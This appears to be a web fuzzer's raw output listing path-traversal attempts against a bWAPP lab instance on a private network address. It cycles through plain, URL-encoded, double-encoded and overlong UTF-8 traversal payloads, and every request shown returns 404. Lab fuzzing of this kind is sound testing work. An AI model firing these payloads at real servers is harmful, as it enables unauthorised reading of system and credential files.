165,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
176,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\{FILE}
174,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
175,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
164,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
177,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
178,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
170,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c{FILE}
169,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c{FILE}
172,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
183,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
182,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
180,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
181,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
188,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
186,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
184,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c{FILE}
179,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
187,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
171,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
185,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
191,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
189,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
194,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
199,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
192,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c{FILE}
75,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c{FILE}
207,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
195,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
196,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
197,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
208,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c{FILE}
193,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c{FILE}
203,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
204,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
202,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
200,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\{FILE}
205,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
212,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
214,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
201,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
213,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
210,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
211,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
209,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
198,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
215,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
206,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
76,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c{FILE}
84,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c{FILE}
77,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c{FILE}
78,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
271,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../{FILE}%00index.html
269,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../{FILE}%00index.html
264,404,9L,39W,http://192.168.1.86/bWAPP/../{FILE}%00index.html
267,404,9L,39W,http://192.168.1.86/bWAPP/../../../../{FILE}%00index.html
265,404,9L,39W,http://192.168.1.86/bWAPP/../../{FILE}%00index.html
270,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../{FILE}%00index.html
266,404,9L,39W,http://192.168.1.86/bWAPP/../../../{FILE}%00index.html
272,404,9L,39W,http://192.168.1.86/bWAPP/..%2f{FILE}%00index.html
274,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f{FILE}%00index.html
287,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html
279,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html
280,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/{FILE}%00index.html
275,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f{FILE}%00index.html
276,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html
281,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/{FILE}%00index.html
282,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html
283,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html
286,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html
285,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html
268,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../{FILE}%00index.html
284,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}%00index.html
278,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html
273,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f{FILE}%00index.html
277,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f{FILE}%00index.html
79,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
154,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
93,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
288,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f{FILE}%00index.html
294,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}%00index.html
300,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f{FILE}%00index.html
297,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f{FILE}%00index.html
293,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}%00index.html
289,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f{FILE}%00index.html
295,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}%00index.html
296,404,9L,39W,http://192.168.1.86/bWAPP/..%252f{FILE}%00index.html
298,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f{FILE}%00index.html
290,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}%00index.html
291,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}%00index.html
292,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}%00index.html
94,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
116,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
109,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
305,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/{FILE}%00index.html
304,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/{FILE}%00index.html
302,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}%00index.html
308,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html
303,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}%00index.html
301,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f{FILE}%00index.html
307,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html
117,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
306,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html
118,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
119,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
310,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html
311,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html
313,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f{FILE}%00index.html
315,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}%00index.html
314,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}%00index.html
309,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html
132,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
190,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
316,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}%00index.html
318,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}%00index.html
125,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
37,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
149,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
322,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\{FILE}%00index.html
323,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\{FILE}%00index.html
38,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
319,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}%00index.html
326,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\{FILE}%00index.html
321,404,9L,39W,http://192.168.1.86/bWAPP/..\..\{FILE}%00index.html
320,404,9L,39W,http://192.168.1.86/bWAPP/..\{FILE}%00index.html
325,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\{FILE}%00index.html
328,404,9L,39W,http://192.168.1.86/bWAPP/..%5c{FILE}%00index.html
329,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c{FILE}%00index.html
327,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\..\{FILE}%00index.html
333,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html
331,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c{FILE}%00index.html
332,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html
335,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}%00index.html
336,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\{FILE}%00index.html
330,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c{FILE}%00index.html
338,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html
324,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\{FILE}%00index.html
49,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/{FILE}
312,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f{FILE}%00index.html
127,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
85,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c{FILE}
340,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html
341,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html
299,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f{FILE}%00index.html
39,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
90,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\{FILE}
346,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html
344,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c{FILE}%00index.html
339,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html
342,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}%00index.html
345,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c{FILE}%00index.html
348,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html
351,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html
349,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html
353,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c{FILE}%00index.html
358,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}%00index.html
354,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c{FILE}%00index.html
359,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}%00index.html
356,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c{FILE}%00index.html
355,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c{FILE}%00index.html
357,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c{FILE}%00index.html
384,404,9L,39W,http://192.168.1.86/bWAPP/..%2f{FILE};index.html
385,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f{FILE};index.html
364,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html
372,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html
363,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html
367,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html
369,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c{FILE}%00index.html
370,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}%00index.html
389,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html
388,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f{FILE};index.html
390,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html
391,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE};index.html
376,404,9L,39W,http://192.168.1.86/bWAPP/../{FILE};index.html
347,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}%00index.html
401,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f{FILE};index.html
400,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f{FILE};index.html
402,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE};index.html
392,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/{FILE};index.html
403,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE};index.html
407,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE};index.html
409,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f{FILE};index.html
412,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f{FILE};index.html
408,404,9L,39W,http://192.168.1.86/bWAPP/..%252f{FILE};index.html
387,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f{FILE};index.html
416,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/{FILE};index.html
417,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/{FILE};index.html
420,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE};index.html
418,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/{FILE};index.html
415,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE};index.html
421,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE};index.html
424,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f{FILE};index.html
423,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE};index.html
441,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c{FILE};index.html
